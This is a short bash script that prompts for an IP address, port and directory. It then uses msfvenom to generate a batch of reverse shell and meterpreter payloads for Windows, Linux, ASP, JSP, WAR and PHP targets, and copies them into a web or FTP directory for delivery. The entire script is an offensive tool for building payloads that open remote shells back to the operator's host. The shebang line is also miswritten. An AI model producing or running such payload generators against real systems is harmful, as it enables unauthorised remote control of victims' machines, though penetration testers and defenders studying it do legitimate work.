!#/bin/bash

#Input ip adress for host
echo ip:
read ip

#Input port
echo port:
read port 

#Choose directories to put shells /ftphome or /var/www/html/
echo where to store rshells:
read directory

#Generate revereseshells to tmp

tempd='/tmp/'

msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"rshell"$port"-x86.exe"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"rshell"$port"-x64.exe"

msfvenom -p linux/x86/shell/reverse_tcp LHOST=$ip LPORT=$port -f elf > $tempd"rshell"$port"-x86.elf"
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$ip LPORT=$port -f elf > $tempd"rshell"$port"-x64.elf"

msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f asp > $tempd"rshell"$port".asp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $tempd"rshell"$port".jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $tempd"rshell"$port".war"
msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -f raw > $tempd"rshell"$port".php"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"mrshell"$port"-x86.exe"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $tempd"mrshell"$port"-x64.exe"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $tempd"mrshell"$port".asp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $tempd"mrshell"$port".jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $tempd"mrshell"$port".war"
msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $tempd"mrshell"$port".php"

#Copy revereseshells
sudo cp $tempd/*rshell* $directory

#Clean up tmp
sudo rm $tempd/*rshell*

exit 0
